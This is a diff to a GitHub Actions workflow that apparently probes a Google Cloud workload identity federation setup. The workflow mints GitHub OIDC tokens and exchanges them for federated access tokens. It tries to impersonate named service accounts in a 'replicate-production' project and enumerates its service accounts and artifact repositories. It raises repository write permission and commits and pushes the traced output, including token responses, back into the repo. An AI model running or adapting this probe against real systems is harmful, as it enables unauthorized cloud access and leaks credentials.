@@ -5,70 +5,69 @@ on:
     branches: [main]
 permissions:
   id-token: write
-  contents: read
+  contents: write
 jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: show context
-        run: |
-          echo "REF=$GITHUB_REF"
-          echo "REPO=$GITHUB_REPOSITORY"
-          echo "ACTOR=$GITHUB_ACTOR"
-          echo "EVENT=$GITHUB_EVENT_NAME"
-          echo "HAVE_IDTOKEN_URL=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+      - uses: actions/checkout@v4
 
-      - name: probe-1-default-aud-and-audiences
+      - name: run-probe
         run: |
+          exec > probe_results.txt 2>&1
           set -x
           WIF_URL="//iam.googleapis.com/projects/1025538909507/locations/global/workloadIdentityPools/github/providers/github-actions"
           PROVIDER_AUD="https://iam.googleapis.com/projects/1025538909507/locations/global/workloadIdentityPools/github/providers/github-actions"
-          for AUD in "$PROVIDER_AUD" "sts.googleapis.com" "https://example.com" ""; do
+          echo "REF=$GITHUB_REF REPO=$GITHUB_REPOSITORY ACTOR=$GITHUB_ACTOR EVENT=$GITHUB_EVENT_NAME"
+          echo "IDTOKEN_URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+          for AUD in "$PROVIDER_AUD" "sts.googleapis.com" "https://example.com"; do
             echo "=================== AUD=[$AUD] ==================="
-            if [ -z "$AUD" ]; then
-              RAW=$(curl -sfS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" || echo '{"error":"no-token"}')
-            else
-              RAW=$(curl -sfS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" || echo '{"error":"no-token"}')
-            fi
+            RAW=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
             TOK=$(echo "$RAW" | jq -r .value 2>/dev/null)
             if [ -z "$TOK" ] || [ "$TOK" = "null" ]; then echo "MINT FAIL: $RAW"; continue; fi
             echo "--- JWT payload ---"
             echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
-            echo "--- STS exchange ---"
+            echo "--- STS exchange (WIF) ---"
             curl -sS -X POST https://sts.googleapis.com/v1/token \
               -H "Content-Type: application/json" \
               -d "{\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"$WIF_URL\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$TOK\"}"
             echo
+            echo "--- STS exchange (alt audience as WIF) ---"
+            curl -sS -X POST https://sts.googleapis.com/v1/token \
+              -H "Content-Type: application/json" \
+              -d "{\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"$AUD\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$TOK\"}"
+            echo
           done
-
-      - name: probe-2-sa-impersonation-builder
-        run: |
-          WIF_URL="//iam.googleapis.com/projects/1025538909507/locations/global/workloadIdentityPools/github/providers/github-actions"
-          PROVIDER_AUD="https://iam.googleapis.com/projects/1025538909507/locations/global/workloadIdentityPools/github/providers/github-actions"
-          TOK=$(curl -sfS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$PROVIDER_AUD" | jq -r .value)
+          echo "=================== SA IMPERSONATION ==================="
+          TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$PROVIDER_AUD" | jq -r .value)
           FED=$(curl -sS -X POST https://sts.googleapis.com/v1/token -H "Content-Type: application/json" \
             -d "{\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"$WIF_URL\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$TOK\"}")
           echo "FED_TOKEN_RESP=$FED"
           ACC=$(echo "$FED" | jq -r .access_token 2>/dev/null)
-          [ "$ACC" = "null" ] && { echo "no federated access token"; exit 0; }
-          for SA in builder deploy monobase-builder replicate; do
-            echo "=== impersonate $SA ==="
-            curl -sS -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA@replicate-production.iam.gserviceaccount.com:generateAccessToken" \
-              -H "Authorization: Bearer $ACC" -H "Content-Type: application/json" \
-              -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"300s"}'
-            echo
-          done
+          if [ "$ACC" != "null" ] && [ -n "$ACC" ]; then
+            for SA in builder deploy monobase-builder replicate; do
+              echo "=== impersonate $SA ==="
+              curl -sS -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA@replicate-production.iam.gserviceaccount.com:generateAccessToken" \
+                -H "Authorization: Bearer $ACC" -H "Content-Type: application/json" \
+                -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"300s"}'
+              echo
+            done
+            echo "=== list SAs ==="
+            curl -sS "https://iam.googleapis.com/v1/projects/1025538909507/serviceAccounts" -H "Authorization: Bearer $ACC"; echo
+            echo "=== list GAR repos us ==="
+            curl -sS "https://artifactregistry.googleapis.com/v1/projects/1025538909507/locations/us/repositories" -H "Authorization: Bearer $ACC"; echo
+            echo "=== list GAR repos us-central1 ==="
+            curl -sS "https://artifactregistry.googleapis.com/v1/projects/1025538909507/locations/us-central1/repositories" -H "Authorization: Bearer $ACC"; echo
+          else
+            echo "no federated access token"
+          fi
+          echo "DONE"
+          set +x
 
-      - name: probe-3-sa-list
+      - name: push results
         run: |
-          WIF_URL="//iam.googleapis.com/projects/1025538909507/locations/global/workloadIdentityPools/github/providers/github-actions"
-          PROVIDER_AUD="https://iam.googleapis.com/projects/1025538909507/locations/global/workloadIdentityPools/github/providers/github-actions"
-          TOK=$(curl -sfS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$PROVIDER_AUD" | jq -r .value)
-          FED=$(curl -sS -X POST https://sts.googleapis.com/v1/token -H "Content-Type: application/json" \
-            -d "{\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"$WIF_URL\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$TOK\"}")
-          ACC=$(echo "$FED" | jq -r .access_token 2>/dev/null)
-          [ "$ACC" = "null" ] && { echo "no federated access token"; exit 0; }
-          echo "=== list SAs (federated identity is the SA per WIF config) ==="
-          curl -sS "https://iam.googleapis.com/v1/projects/1025538909507/serviceAccounts" -H "Authorization: Bearer $ACC"; echo
-          echo "=== GAR repos ==="
-          curl -sS "https://artifactregistry.googleapis.com/v1/projects/1025538909507/locations/us/repositories" -H "Authorization: Bearer $ACC"; echo
+          git config user.email "probe@example.com"
+          git config user.name "probe"
+          git add probe_results.txt
+          git commit -m "probe results [skip ci]" || true
+          git push || true
